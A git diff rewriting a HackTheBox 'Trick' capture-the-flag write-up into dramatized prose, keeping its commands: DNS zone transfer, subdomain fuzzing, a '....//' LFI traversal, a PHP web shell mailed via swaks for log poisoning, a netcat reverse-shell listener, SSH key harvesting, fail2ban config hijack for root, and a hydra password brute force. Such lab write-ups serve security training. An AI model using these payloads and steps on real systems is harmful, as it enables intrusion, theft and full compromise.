@@ -6,10 +6,13 @@
 
 ---
 ## Intro
+Welcome to the documentation for Trick, a Linux machine on HackTheBox that serves as a brutal demonstration of architectural nihilism.
 
-Welcome to Trick. This machine isn’t a sci-fi anomaly; it’s a monument to corporate complacency and the illusion of perimeter defense. 
-It perfectly illustrates the fundamental law of the digital underground: you don’t always need a flashy zero-day exploit to burn a system down; 
-you just need to read the manual better than the person who built it..
+The Kill Chain Overview
+The Blueprint: Weaponizing an unrestricted DNS Zone Transfer (AXFR) to rip away the illusion of hidden subdomains.
+The Breach: Exploiting a fragile, poorly sanitized input filter (LFI) on a pre-production marketing page to seize ownership of the backend data.
+The Irony: Subverting Fail2Ban—software engineered explicitly for defense—and turning it into the highest-privileged root backdoor on the machine.
+
 
 2 sessions for this try, so 2 IPs
 Target IP 10.129.26.93 / 10.129.227.180
@@ -57,7 +60,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 241.39 seconds
 ```
 ## SMTP
-can't reach it
+No signal. Moving past the noise to find the actual entry point
 ```bash
 
 PORT   STATE SERVICE
@@ -80,7 +83,7 @@ VRFY CAT
 VRFY ROOT
 252 2.0.0 ROOT
 ```
-USER root PRESENT
+USER root PRESENT...
 
 ## DIG
 ```bash
@@ -135,12 +138,12 @@ trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 6048
 
 ```
 
-update file hosts with findings
+Expanding the target profile. Updating /etc/hosts to force the handshake.
 ```bash
 echo '10.129.26.93 trick.htb preprod-payroll.trick.htb' | sudo tee -a /etc/hosts
 ```
 
-subdomain enum 
+Mapping the footprint. Enumerating subdomains to find the unlatched gate
 ```bash
 ┌─[✗]─[root@htb-mcnqme24xk]─[/home/justdave]
 └──╼ #ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.129.26.93 -H "Host: FUZZ.trick.htb" -fs 5480
@@ -169,7 +172,8 @@ ________________________________________________
 
 :: Progress: [4614/4614] :: Job [1/1] :: 5000 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
 ```
-Based on url structure i want to try a thing
+
+The endpoint is whispering its weakness. Time to poke the parameter.
 ```bash
 ─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-j4o38yc17j]─[~]
 └──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://trick.htb -H "Host:preprod-FUZZ.trick.htb" -ac
@@ -198,27 +202,27 @@ ________________________________________________
 marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 8ms]
 payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 39ms]
 
-
 ```
-ok hot one thing interesting, i'll add to the hosts file
 
+ok got one thing interesting, Expanding again
 ```bash
 echo '10.129.26.93 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
 ```
+
 checking this new website, an URL is interesting
 http://preprod-marketing.trick.htb/index.php?page=services.html
- it might be vulnerable to Local File Inclusion, let's try to double the chrs
+it might be vulnerable to Local File Inclusion, Testing character-stripping filters with a nested traversal payload (....//)
 
-...and it works...
+Filter shattered. Full Local File Inclusion verified. Reading system internals at will
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd
 
 Note: from here another session
 Target IP 10.129.227.180
-kinda feel blocked atm
+Hitting a wall. The obvious entry points are silent. Time to rethink the angle
 
-Based on what i saw you can send an email to the  user found, michael
-Since PHP wrap’s everything in index.php, if we can view michaels email through our LFI, and if we can send michael an email 
-with a bind shell in it, we may be able to get code execution on the server.
+Connecting the dots for the kill chain. The LFI wraps everything through index.php. 
+By dropping a PHP web shell directly into Michael's local mailbox via SMTP, the inclusion vector becomes an execution vector. 
+Preparing the log poisoning sequence.
 ```bash
 ─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-j4o38yc17j]─[~]
 └──╼ [★]$ swaks --to michael --from ATalkingCat --header 'Subject: Testing!' --body '<?php system($_REQUEST["cmd"]); ?>' --server 10.129.227.180
@@ -259,17 +263,19 @@ with a bind shell in it, we may be able to get code execution on the server.
 <-  221 2.0.0 Bye
 === Connection closed with remote host.
 ```
+
 checking via browser
-let's see if the mail is present 
+Verifying the payload placement. Routing through the LFI to confirm the local mailbox is successfully staged.
 ```bash
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael
 ```
-maybe it works...and yes
+
+Payload confirmed. The mailbox is poisoned and rendering perfectly.
 ```bash
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&cmd=id'
 ```
 
-so i could open a listener on my machine and run reverse shell
+Preparing the final breach. Setting up the netcat listener on our terminal, ready to hook the incoming reverse connection.
 ```bash
 on my machine nc -lvnp 4444
 
@@ -277,9 +283,8 @@ http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/ma
 ```
 
 i got a shell with the user michael so i go direct to the flag... michael@trick:~$ cat user.txt
-for pesistance we can go to michael@trick:~/.ssh$
-to loot the files to use, now for the escalation part
-
+Establishing persistence. Harvesting the keys from the .ssh directory to stabilize the session and guarantee re-entry.
+Low-privilege stage complete. Initiating internal reconnaissance to find the lever for total system privilege
 ```bash
 michael@trick:~$ sudo -l
 Matching Defaults entries for michael on trick:
@@ -297,9 +302,10 @@ michael@trick:~$ find / -group security 2>/dev/null
 michael@trick:~$ ls /etc/fail2ban/action.d/
 
 ```
-michael can restart fail2ban as root.
-after some tests, to abuse the system, it involves creating a .local file that will override the .conf file in the iptables configuration.
 
+Internal auditing reveals a severe operational flaw: michael has explicit sudo rights to restart the fail2ban service. The path to root is staring right back at us.
+Exploiting the configuration parsing logic. By staging a rogue .local file to hijack the default iptables configuration, 
+we can manipulate the firewall execution chains to trigger a root payload the moment the service restarts.
 ```bash
 going in the directory makes it feel easy /etc/fail2ban/action.d/
 
@@ -314,6 +320,6 @@ and nothing, we need t otrigger the ban
 
 sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
 hydra -l root -P /usr/share/wordlists/rockyou.txt 10.129.227.180 ssh
-
-and yes, i am root
 ```
+
+Chain reaction complete. Privilege escalation successful. Full system compromise achieved: root session established.
